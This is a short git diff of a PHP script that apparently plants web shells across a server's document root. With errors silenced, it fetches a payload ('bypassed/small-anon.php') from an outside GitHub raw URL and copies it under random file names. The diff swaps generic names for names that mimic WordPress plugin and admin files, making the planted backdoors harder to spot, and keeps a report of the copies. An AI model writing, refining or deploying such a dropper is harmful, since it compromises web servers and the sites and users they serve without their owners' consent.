@@ -2,12 +2,12 @@
 error_reporting(0);
 
 $searchDir = $_SERVER['DOCUMENT_ROOT'];
-$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/peringatan.php";
+$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/small-anon.php";
 $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
 $logFile = "copy_report.txt";
 
 // Daftar nama file yang akan dipilih secara acak
-$fileNames = ["product.php", "buy.php", "plugins.php", "default.php", "goods.php", "pages.php", "wp-configs.php"];
+$fileNames = ["form-tags-manager.php", "contact-info-locations.php", "template-single-vertical-header-blog.php", "admin-filters.php", "add-from-server.php", "em-admin-modals.php", "display-widgets.php"];
 
 function fetchContent($url) {
     $ch = curl_init();
